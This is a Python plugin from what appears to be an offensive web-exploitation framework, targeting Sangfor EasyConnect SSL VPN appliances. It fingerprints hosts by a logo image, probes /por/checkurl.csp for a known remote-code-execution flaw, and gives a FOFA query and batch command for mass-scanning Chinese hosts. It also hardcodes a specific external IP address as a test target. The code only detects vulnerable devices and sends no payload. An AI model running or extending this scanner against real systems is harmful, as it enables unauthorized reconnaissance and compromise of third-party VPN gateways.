# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30
import hashlib

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: "CommonName: sslvpn" && "Organization: sangfor"
# python batch.py -m exploit.web.Vpn.easyConnect_rce -fs "\"CommonName: sslvpn\" && \"Organization: sangfor\" && country=\"CN\""
class Script(BaseScript):
    name = 'easyConnect'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/com/images/ec-logo.png']
        # exec
        self.execPathList = ['/por/checkurl.csp']
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = 'version < SSLM7.6.6(20181120) or version < SSLM7.6.6R1(20181225)'

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                        await asyncio.sleep(2)
                        if response is not None:
                            if response.status == 200 and response.headers["Content-Type"] == 'image/png':
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('easyConnect Finger', url))
                                return {'name': 'easyConnect Finger', 'url': url, 'software': 'easyConnect'}
        except Exception:
            return None

    async def exec(self):
        try:
            async with aiohttp.ClientSession() as session:
                for execPath in self.execPathList:
                    url = f'http://{self.target}{execPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    async with session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                        await asyncio.sleep(2)
                        if response is not None:
                            text = await response.text()
                            if response.status == 200 and text == '2':
                                tqdm.write(Fore.RED + '[{}] {}'.format('easyConnect RCE', url))
                                return {'name': 'easyConnect RCE', 'url': url, 'software': 'easyConnect'}
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib
    resp = requests.get('http://61.150.65.205:9999/image/favicon.png')
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)

    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
